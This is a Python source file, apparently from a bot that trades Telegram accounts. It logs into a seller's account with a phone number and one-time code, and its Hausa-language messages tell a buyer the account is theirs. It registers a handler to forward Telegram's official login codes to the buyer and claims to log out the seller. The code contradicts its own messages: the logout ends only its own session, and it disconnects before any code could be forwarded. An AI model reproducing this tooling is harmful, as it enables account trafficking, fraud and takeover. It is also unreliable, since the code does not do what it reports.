import os
from telethon import TelegramClient, events, errors
from telethon.sessions import StringSession
from dotenv import load_dotenv
from telethon.tl.functions.auth import LogOutRequest
from aiogram import Bot

load_dotenv()

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")

SESSIONS_DIR = "sessions"
os.makedirs(SESSIONS_DIR, exist_ok=True)


async def secure_account(phone: str, otp: str, buyer_id: int, bot: Bot) -> str:
    session_file = os.path.join(SESSIONS_DIR, phone.replace("+", ""))
    client = TelegramClient(session_file, API_ID, API_HASH)

    try:
        await client.connect()

        if not await client.is_user_authorized():
            try:
                await client.sign_in(phone=phone, code=otp)
            except errors.SessionPasswordNeededError:
                await bot.send_message(buyer_id, "⚠ Lambar tana da 2FA/password. Ka cire 2FA kafin ka sake tura.")
                return "2FA required"
            except Exception as e:
                await bot.send_message(buyer_id, f"❌ Kuskure wajen login: {e}")
                return "login failed"

        # Tura OTP daga 777000
        @client.on(events.NewMessage(from_users=777000))
        async def forward_otp(event):
            await bot.send_message(buyer_id, f"📨 OTP daga Telegram:\n{event.text}")

        await bot.send_message(buyer_id, f"✅ An shiga account: {phone}.")
        await bot.send_message(buyer_id, "📡 Ina jiran sabbin OTPs. Zasu zo kai tsaye a nan.")

        # Logout seller
        try:
            await client(LogOutRequest())
            await bot.send_message(buyer_id, "🚪 An cire account daga na'urar seller.")
        except Exception as e:
            await bot.send_message(buyer_id, f"⚠ Kuskure wajen logout seller: {e}")

        await client.disconnect()
        return "success"

    except Exception as e:
        await bot.send_message(buyer_id, f"❌ Babban kuskure: {e}")
        return "critical error"
